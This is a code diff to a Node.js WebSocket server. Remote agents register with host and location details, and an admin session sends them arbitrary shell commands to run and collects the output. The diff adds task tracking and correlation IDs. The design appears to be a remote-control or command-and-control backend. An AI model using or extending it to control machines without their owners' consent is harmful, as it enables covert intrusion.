@@ -9,6 +9,9 @@ const telegramService = require('../services/telegramService');
 const connectedClients = new Map(); // Map of uuid -> websocket
 const adminSessions = new Set(); // Store admin web sessions separately
 
+// Global map for taskId to correlationId
+const taskToCorrelationMap = new Map();
+
 // Helper function to get client connection
 const getClientConnection = (uuid) => {
   return connectedClients.get(uuid);
@@ -283,6 +286,8 @@ const wsHandler = (ws, req) => {
                 isAuthenticated = true;
                 clientType = 'client';
                 clientId = data.uuid || data.agentId;
+                ws.uuid = clientId;  // Set on the ws object
+                ws.clientType = 'client';  // Set clientType on ws
                 clearTimeout(authTimeout);
                 
                 console.log('Client registered:', clientId);
@@ -318,33 +323,36 @@ const wsHandler = (ws, req) => {
                         systemInfo: data.systemInfo || {}
                     };
                     
-                    console.log('Calling websocketHandlers.handleClientRegistration with normalized data:', normalizedData);
-                    const client = await websocketHandlers.handleClientRegistration(normalizedData, ws);
-                    console.log('Integration layer registration completed successfully');
+                    // Register client using integration layer
+                    await websocketHandlers.registerClient(normalizedData);
+                    console.log('Integration layer registration completed');
+                } catch (integrationError) {
+                    console.error('Integration layer registration failed:', integrationError.message);
                     
-                    // Process pending tasks for this client
-                    if (client && client.uuid) {
-                        await processPendingTasks(client.uuid, ws);
-                    }
-                } catch (error) {
-                    console.log('Integration layer error:', error.message);
                     // Fallback to direct database registration
                     try {
+                        const updateData = {
+                            uuid: data.uuid,
+                            computerName: data.computerName || 'Unknown',
+                            hostname: data.hostname || 'Unknown',
+                            ip: data.ip || data.ipAddress || 'Unknown',
+                            ipAddress: data.ipAddress || data.ip || 'Unknown',
+                            country: data.country || 'Unknown',
+                            platform: data.platform || 'Unknown',
+                            operatingSystem: data.platform || 'Unknown',
+                            osVersion: data.platform || 'Unknown',
+                            architecture: data.architecture || 'Unknown',
+                            capabilities: data.capabilities || {},
+                            systemInfo: data.systemInfo || {},
+                            lastHeartbeat: new Date(),
+                            status: 'online'
+                        };
+                        
                         const client = await Client.findOneAndUpdate(
-                            { uuid: data.uuid || data.agentId },
-                            {
-                                $set: {
-                                    computerName: data.computerName || 'Unknown Computer',
-                                    ipAddress: data.ipAddress || '0.0.0.0',
-                                    platform: data.platform || 'Unknown',
-                                    operatingSystem: data.platform || 'Unknown',
-                                    osVersion: data.platform || 'Unknown',
-                                    architecture: data.architecture || 'Unknown',
-                                    capabilities: data.capabilities || {},
-                                    systemInfo: data.systemInfo || {},
-                                    lastHeartbeat: new Date(),
-                                    status: 'online'
-                                }
+                            { uuid: data.uuid },
+                            { 
+                                $set: updateData,
+                                $inc: { connectionCount: 1 }
                             },
                             { upsert: true, new: true }
                         );
@@ -525,15 +533,24 @@ const wsHandler = (ws, req) => {
                     });
                 }
                 
-                // Broadcast output to admin sessions
+                // Get correlationId from map
+                const correlationId = taskToCorrelationMap.get(taskId);
+                
+                // Broadcast output to admin sessions with correlationId
                 broadcastToAdminSessions({
                     type: 'output',
                     uuid: ws.uuid,
                     taskId: taskId,
+                    correlationId: correlationId,  // Include correlationId
                     output: output,
                     status: status || 'success',
                     timestamp: new Date().toISOString()
                 });
+
+                // Clean up the map entry
+                if (taskToCorrelationMap.has(taskId)) {
+                    taskToCorrelationMap.delete(taskId);
+                }
                 return;
             }
 
@@ -594,18 +611,33 @@ const wsHandler = (ws, req) => {
 
             if (data.type === 'command' && clientType === 'admin') {
                 // Handle command from admin to client
-                const { targetId, command } = data;
+                const { targetId, command, correlationId } = data;
                 console.log(`Admin sending command to client ${targetId}: ${command}`);
-                
+
                 // Find the target client WebSocket
-                const targetClient = Array.from(connectedClients.values()).find(client => 
-                    client.uuid === targetId && client.clientType === 'client'
-                );
-                
-                if (targetClient) {
-                    // Generate taskId for this command
+                const targetClient = connectedClients.get(targetId);
+
+                if (targetClient && targetClient.clientType === 'client') {
+                    // Generate task ID
                     const taskId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-                    
+
+                    // Create task in database
+                    const task = new Task({
+                        taskId: taskId,
+                        agentUuid: targetId,
+                        command: command,
+                        params: {},  // Add params if needed
+                        createdBy: clientId || 'admin',  // Use admin clientId
+                        platform: targetClient.platform || 'unknown',
+                        queue: {
+                            state: 'pending',
+                            attempts: 0,
+                            priority: 0
+                        }
+                    });
+                    await task.save();
+                    console.log('Task created:', taskId);
+
                     // Send command to target client
                     const commandMessage = {
                         cmd: 'execute',
@@ -613,19 +645,30 @@ const wsHandler = (ws, req) => {
                         taskId: taskId,
                         timestamp: new Date().toISOString()
                     };
-                    
+
                     targetClient.send(JSON.stringify(commandMessage));
                     console.log(`Command sent to client ${targetId} with taskId: ${taskId}`);
-                    
-                    // Send confirmation back to admin
+
+                    // Send confirmation back to admin with correlationId
                     ws.send(JSON.stringify({
                         type: 'command_sent',
                         targetId: targetId,
                         command: command,
                         taskId: taskId,
+                        correlationId: correlationId,  // Include correlationId
                         status: 'success',
                         timestamp: new Date().toISOString()
                     }));
+
+                    // Broadcast task creation to admin sessions
+                    broadcastToAdminSessions({
+                        type: 'task_created',
+                        task: task.toObject(),
+                        timestamp: new Date().toISOString()
+                    });
+
+                    // Store correlationId in map
+                    taskToCorrelationMap.set(taskId, correlationId);
                 } else {
                     console.log(`Client ${targetId} not found or not connected`);
                     ws.send(JSON.stringify({
@@ -633,6 +676,7 @@ const wsHandler = (ws, req) => {
                         targetId: targetId,
                         command: command,
                         taskId: null,
+                        correlationId: correlationId,  // Still include if provided
                         status: 'error',
                         error: 'Client not found or not connected',
                         timestamp: new Date().toISOString()
